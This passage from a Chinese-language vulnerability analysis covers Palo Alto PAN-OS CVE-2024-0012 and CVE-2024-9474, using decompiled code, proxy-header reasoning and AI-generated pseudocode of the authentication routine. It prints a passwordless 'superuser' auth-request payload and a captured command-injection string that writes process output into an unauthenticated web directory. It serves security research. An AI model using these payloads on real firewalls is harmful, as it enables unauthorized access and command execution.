<span class="hljs-number">1</span> )<br>    &#123;<br>      zend_error(<span class="hljs-number">900LL</span>, <span class="hljs-string">&quot;%s: get $%s: found&quot;</span>, <span class="hljs-string">&quot;pan_php_superglobal.c&quot;</span>, a1);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( panui_log_level &gt; <span class="hljs-number">899</span> )<br>    &#123;<br>      LODWORD(v3) = getpid();<br>      __pan_print(&amp;unk_349C8, <span class="hljs-number">8LL</span>, <span class="hljs-string">&quot;pan_php_get_superglobal&quot;</span>, <span class="hljs-number">4LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;trace [%d] %s(%d): get $%s: found\n&quot;</span>, v3);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( panui_log_target == <span class="hljs-number">1</span> )<br>  &#123;<br>    zend_error(<span class="hljs-number">900LL</span>, <span class="hljs-string">&quot;%s: get $%s: not found&quot;</span>, <span class="hljs-string">&quot;pan_php_superglobal.c&quot;</span>, a1);<br>    v1 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v1 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">if</span> ( panui_log_level &gt; <span class="hljs-number">899</span> )<br>    &#123;<br>      LODWORD(v4) = getpid();<br>      __pan_print(&amp;unk_349C8, <span class="hljs-number">11LL</span>, <span class="hljs-string">&quot;pan_php_get_superglobal&quot;</span>, <span class="hljs-number">4LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;trace [%d] %s(%d): get $%s: not found\n&quot;</span>, v4);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>是通过 zend_hash_str_find （ PHP 提供的 ）获取 _SERVER 也就是获取 PHP 的 <code>$_SERVER[&#39;REMOTE_HOST&#39;]</code> </p><p>回顾在 CVE-2024-0012 分析 PA 的架构：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">request =&gt; nginx(<span class="hljs-number">443</span>) =&gt; apache(<span class="hljs-number">28250</span>) =&gt; php(php.ini,index.php) =&gt; envSetup.php =&gt; target.php<br></code></pre></td></tr></table></figure><p>PA 是通过 nginx 反向代理把流量给 apache 的，那么就是：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">nginx</span><span class="hljs-params">(<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>)</span></span> =&gt; <span class="hljs-built_in">apache</span>(<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">28250</span>)<br></code></pre></td></tr></table></figure><p>那么 nginx + apache + php 是怎么识别客户端 IP 的呢？</p><p>答案就是 nginx 配置 proxy_set_header：</p><p><img src="/../../images/image-20250607143903378.png" alt="image-20250607143903378"></p><p>这个组合漏洞的巧妙之处就在于 PA nginx 配置这些头部是通过包含的方式：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">include</span> <span class="hljs-keyword">conf</span>/proxy_default.<span class="hljs-keyword">conf</span>;<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250607144108442.png" alt="image-20250607144108442"></p><p>但是 CVE-2024-0012 的 js.map 是没有包含的，所以在 apache 看来就是本地的 nginx 请求本地的 apache。所以第一个限制就过去了。</p><p><img src="/../../images/image-20250607144136338.png" alt="image-20250607144136338"></p><p>然后来看第二个限制 用户认证：</p><p>AI 生成的伪代码如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// 函数目的：执行用户认证请求，处理认证流程并与认证服务通信</span><br><span class="hljs-comment">// 返回值：0表示成功，非0表示失败</span><br><br>__int64 panSwalAuthenticate(<br>    __int64 alloc_ptr,        <span class="hljs-comment">// 内存分配器指针</span><br>    int is_cms_auth,          <span class="hljs-comment">// 是否为CMS认证(1=是,0=否)</span><br>    char <span class="hljs-operator">*</span>username,           <span class="hljs-comment">// 用户名</span><br>    _BYTE <span class="hljs-operator">*</span>password,          <span class="hljs-comment">// 密码(可能为空)</span><br>    __int64 <span class="hljs-keyword">protocol</span>,         <span class="hljs-comment">// 协议类型</span><br>    __int64 ip_address,       <span class="hljs-comment">// IP地址</span><br>    __int64 accessible_vsys,  <span class="hljs-comment">// 可访问的虚拟系统(可能为空)</span><br>    __int64 auth_result,      <span class="hljs-comment">// 认证结果存储结构</span><br>    char <span class="hljs-operator">*</span>error_buf,          <span class="hljs-comment">// 错误信息缓冲区</span><br>    unsigned int error_buf_size, <span class="hljs-comment">// 错误缓冲区大小</span><br>    __int64 client_info,      <span class="hljs-comment">// 客户端信息(可选)</span><br>    __int64 extra_params,     <span class="hljs-comment">// 额外参数(可选)</span><br>    __int64 <span class="hljs-operator">*</span>response_xml     <span class="hljs-comment">// 响应XML存储指针(可选)</span><br>) &#123;<br>    <span class="hljs-comment">// 初始化变量</span><br>    char <span class="hljs-operator">*</span>auth_request_xml <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br>    char <span class="hljs-operator">*</span>sanitized_extra <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br>    char <span class="hljs-operator">*</span>debug_request_xml <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br>    char role_str[<span class="hljs-number">32</span>] <span class="hljs-operator">=</span> &#123;<span class="hljs-number">0</span>&#125;;<br>    int socket_fd <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span>;<br>    void <span class="hljs-operator">*</span>response_data <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br>    int response_len <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    int result <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 默认失败</span><br>    <br>    <span class="hljs-comment">// 清理错误缓冲区</span><br>    <span class="hljs-operator">*</span>error_buf <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 处理可访问VSYS列表</span><br>    <span class="hljs-keyword">if</span> (accessible_vsys) &#123;<br>        <span class="hljs-comment">// 复制VSYS列表到缓冲区</span><br>        char <span class="hljs-operator">*</span>vsys_buf <span class="hljs-operator">=</span> create_string_buffer(alloc_ptr, strlen(accessible_vsys)<span class="hljs-operator">+</span><span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>vsys_buf) &#123;<br>            set_error(error_buf, <span class="hljs-string">&quot;Could not allocate buffer for VSYS names&quot;</span>);<br>            goto cleanup;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (append_string(vsys_buf, accessible_vsys)) &#123;<br>            set_error(error_buf, <span class="hljs-string">&quot;Could not copy VSYS names&quot;</span>);<br>            goto cleanup;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 创建认证请求XML缓冲区</span><br>    auth_request_xml <span class="hljs-operator">=</span> create_string_buffer(alloc_ptr, <span class="hljs-number">1025</span>);<br>    debug_request_xml <span class="hljs-operator">=</span> create_string_buffer(alloc_ptr, <span class="hljs-number">1025</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>auth_request_xml <span class="hljs-operator">||</span> <span class="hljs-operator">!</span>debug_request_xml) &#123;<br>        set_error(error_buf, <span class="hljs-string">&quot;Could not allocate string buffers&quot;</span>);<br>        goto cleanup;<br>    &#125;<br><br>    <span class="hljs-comment">// 转义额外参数中的特殊字符</span><br>    <span class="hljs-keyword">if</span> (extra_params) &#123;<br>        sanitized_extra <span class="hljs-operator">=</span> xmlURIEscapeStr(extra_params, <span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>&#x27; =&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 构建认证请求XML</span><br>    <span class="hljs-keyword">if</span> (is_cms_auth) &#123;<br>        <span class="hljs-comment">// CMS认证模式</span><br>        get_role_string(<span class="hljs-operator">*</span>(int<span class="hljs-operator">*</span>)(auth_result<span class="hljs-operator">+</span><span class="hljs-number">64</span>), role_str, sizeof(role_str));<br>        <br>        <span class="hljs-keyword">if</span> (accessible_vsys <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">*</span>accessible_vsys) &#123;<br>            <span class="hljs-comment">// 包含VSYS列表的请求</span><br>            append_xml(auth_request_xml, <br>                <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> cms-client=<span class="hljs-subst">\&quot;</span>yes<span class="hljs-subst">\&quot;</span> is-vsys-admin=<span class="hljs-subst">\&quot;</span>yes<span class="hljs-subst">\&quot;</span> &quot;</span><br>                <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> role=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>                username, ip_address, <span class="hljs-keyword">protocol</span>, role_str, sanitized_extra);<br>            <br>            <span class="hljs-keyword">if</span> (client_info) &#123;<br>                append_xml(auth_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>            &#125;<br>            <br>            append_xml(auth_request_xml, <span class="hljs-string">&quot;&gt;&quot;</span>);<br>            append_xml(auth_request_xml, <span class="hljs-string">&quot;&lt;vsys&gt;&quot;</span>);<br>            <br>            <span class="hljs-comment">// 添加每个VSYS</span><br>            char <span class="hljs-operator">*</span>vsys <span class="hljs-operator">=</span> strtok(accessible_vsys, <span class="hljs-string">&quot;,&quot;</span>);<br>            <span class="hljs-keyword">while</span> (vsys) &#123;<br>                append_xml(auth_request_xml, <span class="hljs-string">&quot;&lt;member&gt;%s&lt;/member&gt;&quot;</span>, vsys);<br>                vsys <span class="hljs-operator">=</span> strtok(<span class="hljs-type">NULL</span>, <span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br>            <br>            append_xml(auth_request_xml, <span class="hljs-string">&quot;&lt;/vsys&gt;&lt;/auth-request&gt;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 不包含VSYS列表的请求</span><br>            append_xml(auth_request_xml, <br>                <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> cms-client=<span class="hljs-subst">\&quot;</span>yes<span class="hljs-subst">\&quot;</span> &quot;</span><br>                <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> role=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>                username, ip_address, <span class="hljs-keyword">protocol</span>, role_str, sanitized_extra);<br>            <br>            <span class="hljs-keyword">if</span> (client_info) &#123;<br>                append_xml(auth_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>            &#125;<br>            <br>            append_xml(auth_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>        &#125;<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">*</span>password) &#123;<br>        <span class="hljs-comment">// 密码认证模式</span><br>        append_xml(auth_request_xml, <br>            <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> passwd=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> &quot;</span><br>            <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>            username, password, ip_address, <span class="hljs-keyword">protocol</span>, sanitized_extra);<br>        <br>        <span class="hljs-comment">// 创建调试用的请求(隐藏密码)</span><br>        append_xml(debug_request_xml, <br>            <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> passwd=<span class="hljs-subst">\&quot;</span>****<span class="hljs-subst">\&quot;</span> &quot;</span><br>            <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>            username, ip_address, <span class="hljs-keyword">protocol</span>, sanitized_extra);<br>        <br>        <span class="hljs-keyword">if</span> (client_info) &#123;<br>            append_xml(auth_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>            append_xml(debug_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>        &#125;<br>        <br>        append_xml(auth_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>        append_xml(debug_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 无密码认证模式</span><br>        append_xml(auth_request_xml, <br>            <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> &quot;</span><br>            <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>            username, ip_address, <span class="hljs-keyword">protocol</span>, sanitized_extra);<br>        <br>        <span class="hljs-comment">// 调试请求与认证请求相同</span><br>        append_xml(debug_request_xml, <br>            <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> &quot;</span><br>            <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>            username, ip_address, <span class="hljs-keyword">protocol</span>, sanitized_extra);<br>        <br>        <span class="hljs-keyword">if</span> (client_info) &#123;<br>            append_xml(auth_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>            append_xml(debug_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>        &#125;<br>        <br>        append_xml(auth_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>        append_xml(debug_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 记录调试信息</span><br>    <span class="hljs-keyword">if</span> (log_level <span class="hljs-operator">&gt;=</span> <span class="hljs-number">800</span>) &#123;<br>        log_debug(<span class="hljs-string">&quot;Auth request: %s&quot;</span>, debug_request_xml);<br>    &#125;<br><br>    <span class="hljs-comment">// 连接到认证服务(本地127.0.0.1:10000)</span><br>    socket_fd <span class="hljs-operator">=</span> connect_to_auth_service(<span class="hljs-number">0x7F000001</span>, <span class="hljs-number">10000</span>);<br>    <span class="hljs-keyword">if</span> (socket_fd <span class="hljs-operator">&lt;</span> <span class="hljs-number">0</span>) &#123;<br>        set_connection_error(error_buf);<br>        goto cleanup;<br>    &#125;<br><br>    <span class="hljs-comment">// 发送请求并获取响应</span><br>    response_data <span class="hljs-operator">=</span> send_and_receive(socket_fd, auth_request_xml, strlen(auth_request_xml), <span class="hljs-operator">&amp;</span>response_len);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>response_data) &#123;<br>        goto close_socket;<br>    &#125;<br><br>    <span class="hljs-comment">// 可选: 保存原始响应XML</span><br>    <span class="hljs-keyword">if</span> (response_xml) &#123;<br>        <span class="hljs-operator">*</span>response_xml <span class="hljs-operator">=</span> create_string_buffer(alloc_ptr, response_len<span class="hljs-operator">+</span><span class="hljs-number">1</span>);<br>        append_string(<span class="hljs-operator">*</span>response_xml, response_data);<br>    &#125;<br><br>    <span class="hljs-comment">// 记录响应调试信息</span><br>    <span class="hljs-keyword">if</span> (log_level <span class="hljs-operator">&gt;=</span> <span class="hljs-number">800</span>) &#123;<br>        log_debug(<span class="hljs-string">&quot;Auth response: %s&quot;</span>, response_data);<br>    &#125;<br><br>    <span class="hljs-comment">// 解析XML响应</span><br>    xmlDocPtr doc <span class="hljs-operator">=</span> xmlReadMemory(response_data, response_len, <span class="hljs-string">&quot;noname.xml&quot;</span>, <span class="hljs-type">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>doc) &#123;<br>        set_error(error_buf, <span class="hljs-string">&quot;Error parsing XML response&quot;</span>);<br>        goto close_socket;<br>    &#125;<br><br>    xmlNodePtr root <span class="hljs-operator">=</span> xmlDocGetRootElement(doc);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>root) &#123;<br>        set_error(error_buf, <span class="hljs-string">&quot;Could not get root element&quot;</span>);<br>        goto free_doc;<br>    &#125;<br><br>    <span class="hljs-comment">// 处理认证响应</span><br>    parse_auth_response(alloc_ptr, root, auth_result, error_buf, error_buf_size);<br><br>    <span class="hljs-comment">// 检查是否认证成功</span><br>    <span class="hljs-keyword">if</span> (strcmp((char<span class="hljs-operator">*</span>)(auth_result<span class="hljs-operator">+</span><span class="hljs-number">132</span>), <span class="hljs-string">&quot;success&quot;</span>) <span class="hljs-operator">==</span> <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 认证成功</span><br>        strncpy(error_buf, (char<span class="hljs-operator">*</span>)(auth_result<span class="hljs-operator">+</span><span class="hljs-number">420</span>), error_buf_size);<br>        result <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>free_doc:<br>    xmlFreeDoc(doc);<br>close_socket:<br>    close_socket(socket_fd);<br>cleanup:<br>    <span class="hljs-comment">// 释放所有资源</span><br>    <span class="hljs-keyword">if</span> (sanitized_extra) xmlFree(sanitized_extra);<br>    <span class="hljs-keyword">if</span> (auth_request_xml) free_string_buffer(auth_request_xml);<br>    <span class="hljs-keyword">if</span> (debug_request_xml) free_string_buffer(debug_request_xml);<br>    <span class="hljs-keyword">if</span> (response_data) free(response_data);<br>    <span class="hljs-keyword">if</span> (vsys_buf) free_string_buffer(vsys_buf);<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为不是 cms 然后传输的时候无密码：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">authResult = authenticateUser(<br>    <span class="hljs-attribute">user</span>=user,<br>    <span class="hljs-attribute">password</span>=<span class="hljs-string">&quot;&quot;</span>,  # 密码可能在其他地方处理<br>    <span class="hljs-attribute">protocol</span>=protocolType,<br>    <span class="hljs-attribute">host</span>=remoteHost,<br>    <span class="hljs-attribute">vsys</span>=accessibleVsys,<br>    <span class="hljs-attribute">sessionData</span>=sessionData<br>)<br></code></pre></td></tr></table></figure><p>所以 payload 就是第三种 无密码认证模式</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;auth-request username<span class="hljs-operator">=</span><span class="hljs-string">&quot;superuser&quot;</span> ip-address<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> protocol<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;</span><br></code></pre></td></tr></table></figure><p>看下 10000 是什么东西：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">netstat -tulnp | <span class="hljs-keyword">grep</span> <span class="hljs-number">10000</span><br><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/mgm</span>tsrvr<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250607153001829.png" alt="image-20250607153001829"></p><blockquote><p>暂时没有分析出来，为什么会认证成功</p></blockquote><p>认证成功后就走 else 然后根据 POST 的参数去设置 SESSION</p><p><img src="/../../images/image-20250607160122730.png" alt="image-20250607160122730"></p><p>之后 EXP 的触发是通过 index.php 携带上面的 SESSION 。</p><p>watchtowr 是根据 Diff 发现 AuditLog.php、createRemoteAppwebSession.php 存在比较大的变化：</p><p><img src="/../../images/image-20250607203811754.png" alt="image-20250607203811754"></p><p><img src="/../../images/image-20250607203830813.png" alt="image-20250607203830813"></p><p><img src="/../../images/image-20250607203920292.png" alt="image-20250607203920292"></p><p>但是找不到具体的触发点，参考源影公众号上面的通过进程定位。通过 exp 执行命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ps -auxf</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sh -c <span class="hljs-built_in">export</span> <span class="hljs-attribute">panusername</span>=<span class="hljs-string">&quot;`ps -axf&gt;/var/appweb/htdocs/unauth/5rIRJW.php`&quot;</span>;export <span class="hljs-attribute">superuser</span>=<span class="hljs-string">&quot;1&quot;</span>;export <span class="hljs-attribute">isxml</span>=<span class="hljs-string">&quot;yes&quot;</span>;/usr/local/bin/sdb -e -n ha.app.local.state<br></code></pre></td></tr></table></figure><p>PHP 里面是找不到命令的，所以是在包里面。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -r <span class="hljs-string">&#x27;panusername&#x27;</span> <span class="hljs-regexp">/usr/</span>lib64/<br><br><br><span class="hljs-keyword">grep</span> -r -C <span class="hljs-number">2</span> <span class="hljs-string">&quot;panusername&quot;</span> <span class="hljs-regexp">/usr/</span>lib64/<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/">https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/</a></p></li><li><p><a href="https://paigekim29.medium.com/understanding-x-forwarded-for-header-settings-in-nginx-4929f49d57dd">https://paigekim29.medium.com/understanding-x-forwarded-for-header-settings-in-nginx-4929f49d57dd</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmA">https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmA</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
